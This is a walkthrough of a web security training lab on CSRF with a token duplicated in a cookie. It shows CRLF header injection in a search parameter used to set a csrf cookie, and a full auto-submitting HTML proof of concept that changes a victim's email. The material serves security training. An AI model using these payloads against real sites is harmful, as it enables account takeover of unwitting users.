# Lab: CSRF where token is duplicated in cookie

This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter

# Step 1 Investigate the email change functionality of this webapp

I capture the request and send it to repeater, and notice that the csrf cookie and token are the same value:

![image](https://user-images.githubusercontent.com/83407557/210909167-8e1fae85-89ed-485d-b08e-89a23d1bef8a.png)

If I change them both to the word hacked, my request still goes through, this tells me that the cookie and token are not tied to the session:

![image](https://user-images.githubusercontent.com/83407557/210909309-dfae4145-958f-4fc0-8bed-0a7f5b8a899a.png)

# Step 2 Find a HTTP host header attack on same domain

Before I can perform a CSRF attack, I still need to find a way to chain this attack with a HTTP host header attack, in order to set the victim's csrf cookie to the same value as the csrf token being sent with my payload. I find a vulnerable search function that will allow me to perform this action:

![image](https://user-images.githubusercontent.com/83407557/210909578-c5af4225-0bcf-401a-90dc-ba05fcfc2da7.png)


When I search for something, like the string "test":

![image](https://user-images.githubusercontent.com/83407557/210909661-81304bf5-e5a4-441e-9270-6137d4e744ef.png)

I get a cookie set called LastSearchTerm:

![image](https://user-images.githubusercontent.com/83407557/210909731-e732252c-8a30-405c-9af0-9078b33544e3.png)

If I add the following payload, I can trigger a new cookie to be created in a user's session with the name hermh4cks and the value of awesome

note the following for the payload

| character | url-encoded |
| - | - |
| `\r\n` | `%0d%0a` |
| `;` | `%3b` |
| "space" | `%20` |

**payload**
```html
%0d%0aSet-Cookie:%20hermh4cks=awesome%3b%20SameSite=None
```

![image](https://user-images.githubusercontent.com/83407557/210910468-51f42393-b678-48de-a4b8-4d9e01486626.png)

And note the newly added cookie:

![image](https://user-images.githubusercontent.com/83407557/210910641-c6c682f0-88d1-40a4-b43b-6911cbfb7680.png)

With this info I can create a link that will set a csrf cookie to the value of hermhacks:

https://0a5e00bb038c237fc3282a4b0013004a.web-security-academy.net/?search=HHHattack%0d%0aSet-Cookie:%20csrf=hermh4cks%3b%20SameSite=None

# Step 3 Create a CSRF POC

going back to my HTTP history, I find my POST request to change an email:

![image](https://user-images.githubusercontent.com/83407557/210911036-a8ab4f50-78b7-4808-a742-6531af44a07a.png)

I right click the request and go engagement tools-->generate CSRF POC

![image](https://user-images.githubusercontent.com/83407557/210911130-95f838f7-f5dc-44d4-bcdf-84a24016f382.png)

I generate a POC, change the csrf token value to hermh4cks, and add the following img tag that will set the victim's csrf cookie to the same value as the token in my CSRF POC:

```html
<img src="https://0a5e00bb038c237fc3282a4b0013004a.web-security-academy.net/?search=HHHattack%0d%0aSet-Cookie:%20csrf=hermh4cks%3b%20SameSite=None"onerror="document.forms[0].submit()">
```

Full payload:

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a5e00bb038c237fc3282a4b0013004a.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;test&#46;com" />
      <input type="hidden" name="csrf" value="hermh4cks" />
      <input type="submit" value="Submit request" />
    </form>
      <img src="https://0a5e00bb038c237fc3282a4b0013004a.web-security-academy.net/?search=HHHattack%0d%0aSet-Cookie:%20csrf=hermh4cks%3b%20SameSite=None"onerror="document.forms[0].submit()">
  </body>
</html>
```

# Step 4 Host POC on attack server and send to victim

I put the payload in the body of /exploit on my attack server:

![image](https://user-images.githubusercontent.com/83407557/210911756-1d7679d5-eb4e-4270-b96e-8b31ba16f852.png)

I store it and send it to the victim, solving the lab:

![image](https://user-images.githubusercontent.com/83407557/210911835-47f01cb5-6beb-4d7d-bba9-aa97e817ce92.png)


